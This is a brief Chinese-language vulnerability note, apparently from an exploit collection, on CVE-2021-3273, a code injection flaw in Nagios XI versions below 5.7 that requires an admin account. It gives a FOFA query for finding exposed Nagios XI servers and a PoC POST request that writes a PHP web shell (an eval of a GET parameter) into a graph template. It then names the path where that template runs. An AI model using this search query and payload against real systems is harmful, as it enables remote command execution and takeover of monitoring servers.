# Nagios 代码注入漏洞 (CVE-2021-3273)


低于5.7的Nagios XI受/nagiosxi/admin/graphtemplates.php组件中的代码注入的影响。要利用此漏洞，攻击者必须在Nagios XI的Web系统中拥有一个管理员用户帐户。

FOFA：

```
app="Nagios-XI"
```

在nagios xi 5.7中，管理员可以编辑/删除/添加模板，/nagiosxi/admin/graphtemplates.php 模板将存储在/usr/local/nagios/share/pnp/templates中。通过访问/nagios/pnp/templates/?.php进行执行。

**PoC：**


```
POST /nagiosxi/admin/graphtemplates.php?edit=check_local_disk.php&dir=templates HTTP/1.1
Host:
...

<?php @eval($_GET['cmd']); ?>
```

ref:

* https://nvd.nist.gov/vuln/detail/CVE-2021-3273
* https://gist.github.com/leommxj/93edce6f8572cefe79a3d7da4389374e